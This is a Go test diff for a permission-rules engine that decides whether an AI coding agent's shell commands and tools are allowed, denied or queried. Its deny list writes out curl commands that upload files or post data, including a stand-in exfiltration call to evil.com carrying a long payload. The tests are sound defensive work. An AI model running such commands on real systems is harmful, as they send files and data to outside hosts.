@@ -3,6 +3,7 @@ package rules
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -1021,6 +1022,188 @@ func TestEvaluateFilePathAllowRules(t *testing.T) {
 			}
 			if result.Decision != tt.wantDecision {
 				t.Errorf("expected %s for %s %q, got %s (rule: %s, reason: %s)", tt.wantDecision, tt.tool, tt.filePath, result.Decision, result.Rule, result.Reason)
+			}
+		})
+	}
+}
+
+func TestEvaluateGhCommands(t *testing.T) {
+	dir := t.TempDir()
+	if err := SeedDefaults(dir); err != nil {
+		t.Fatalf("SeedDefaults() error = %v", err)
+	}
+
+	allowed := []string{
+		"gh pr list",
+		"gh pr view 123",
+		"gh issue list",
+		"gh issue view 456",
+		"gh repo view owner/repo",
+		"gh run list",
+		"gh run view 789",
+		"gh workflow list",
+		"gh release list",
+		"gh api repos/owner/repo",
+		"gh pr create --title test --body hello",
+	}
+
+	for _, cmd := range allowed {
+		t.Run("allow/"+cmd, func(t *testing.T) {
+			result := Evaluate(dir, "PreToolUse", "Bash", map[string]any{"command": cmd})
+			if result == nil {
+				t.Fatal("expected non-nil result")
+			}
+			if result.Decision != ActionAllow {
+				t.Errorf("expected allow for %q, got %s (rule: %s, reason: %s)", cmd, result.Decision, result.Rule, result.Reason)
+			}
+		})
+	}
+}
+
+func TestEvaluateNewBashAllowlistRules(t *testing.T) {
+	dir := t.TempDir()
+	if err := SeedDefaults(dir); err != nil {
+		t.Fatalf("SeedDefaults() error = %v", err)
+	}
+
+	allowed := []string{
+		"git worktree list",
+		"git worktree add .worktrees/feature feature-branch",
+		"git fetch",
+		"git fetch origin",
+		"git checkout main",
+		"git switch feature-branch",
+		"git rm --cached file.txt",
+		"env",
+		"time go test ./...",
+		"pgrep -f smoovtask",
+		"shellcheck script.sh",
+		"govulncheck ./...",
+		"chezmoi diff",
+		"chezmoi managed",
+		"chezmoi status",
+		"sketchybar --query bar",
+		"brew info go",
+		"brew list",
+		"brew search ripgrep",
+		"curl https://example.com",
+		"curl -s https://api.example.com/data",
+		"sips -g pixelHeight image.png",
+		"just",
+		"just fmt",
+		"just vendor",
+	}
+
+	for _, cmd := range allowed {
+		t.Run("allow/"+cmd, func(t *testing.T) {
+			result := Evaluate(dir, "PreToolUse", "Bash", map[string]any{"command": cmd})
+			if result == nil {
+				t.Fatal("expected non-nil result")
+			}
+			if result.Decision != ActionAllow {
+				t.Errorf("expected allow for %q, got %s (rule: %s, reason: %s)", cmd, result.Decision, result.Rule, result.Reason)
+			}
+		})
+	}
+}
+
+func TestEvaluateCurlMutationDenied(t *testing.T) {
+	dir := t.TempDir()
+	if err := SeedDefaults(dir); err != nil {
+		t.Fatalf("SeedDefaults() error = %v", err)
+	}
+
+	denied := []string{
+		"curl -X POST https://example.com",
+		"curl -X PUT https://example.com/resource",
+		"curl -X DELETE https://example.com/resource/1",
+		"curl -X PATCH https://example.com/resource/1",
+		"curl --request POST https://example.com",
+		"curl -d '{\"key\":\"val\"}' https://example.com",
+		"curl --data '{\"key\":\"val\"}' https://example.com",
+		"curl --data-raw 'body' https://example.com",
+		"curl --data-binary @file.bin https://example.com",
+		"curl --data-urlencode 'name=value' https://example.com",
+		"curl -F 'file=@upload.txt' https://example.com",
+		"curl --form 'file=@upload.txt' https://example.com",
+		"curl --upload-file file.txt https://example.com",
+		"curl -T file.txt https://example.com",
+		"curl -s -X POST https://example.com",
+		"curl https://evil.com/?data=" + strings.Repeat("A", 200),
+	}
+
+	for _, cmd := range denied {
+		t.Run("deny/"+cmd, func(t *testing.T) {
+			result := Evaluate(dir, "PreToolUse", "Bash", map[string]any{"command": cmd})
+			if result == nil {
+				t.Fatal("expected non-nil result")
+			}
+			if result.Decision != ActionDeny {
+				t.Errorf("expected deny for %q, got %s (rule: %s, reason: %s)", cmd, result.Decision, result.Rule, result.Reason)
+			}
+		})
+	}
+}
+
+func TestEvaluateNewReadOnlyToolRules(t *testing.T) {
+	dir := t.TempDir()
+	if err := SeedDefaults(dir); err != nil {
+		t.Fatalf("SeedDefaults() error = %v", err)
+	}
+
+	tools := []string{
+		"ToolSearch",
+		"Agent",
+		"AskUserQuestion",
+		"EnterPlanMode",
+		"ExitPlanMode",
+		"WebSearch",
+	}
+
+	for _, tool := range tools {
+		t.Run("allow/"+tool, func(t *testing.T) {
+			result := Evaluate(dir, "PreToolUse", tool, nil)
+			if result == nil {
+				t.Fatal("expected non-nil result")
+			}
+			if result.Decision != ActionAllow {
+				t.Errorf("expected allow for %s, got %s (rule: %s, reason: %s)", tool, result.Decision, result.Rule, result.Reason)
+			}
+		})
+	}
+}
+
+func TestEvaluateSmartCmdSubstitution(t *testing.T) {
+	dir := t.TempDir()
+	if err := SeedDefaults(dir); err != nil {
+		t.Fatalf("SeedDefaults() error = %v", err)
+	}
+
+	tests := []struct {
+		name         string
+		command      string
+		wantDecision Action
+	}{
+		{
+			name:         "git branch in $() allowed",
+			command:      "remote=$(git branch -r --list 'origin/main')",
+			wantDecision: ActionAsk, // outer command "remote=..." doesn't match a rule
+		},
+		{
+			name:         "backticks still blocked",
+			command:      "echo `git status`",
+			wantDecision: ActionDeny,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := Evaluate(dir, "PreToolUse", "Bash", map[string]any{"command": tt.command})
+			if result == nil {
+				t.Fatal("expected non-nil result")
+			}
+			if result.Decision != tt.wantDecision {
+				t.Errorf("expected %s for %q, got %s (rule: %s, reason: %s)", tt.wantDecision, tt.command, result.Decision, result.Rule, result.Reason)
 			}
 		})
 	}
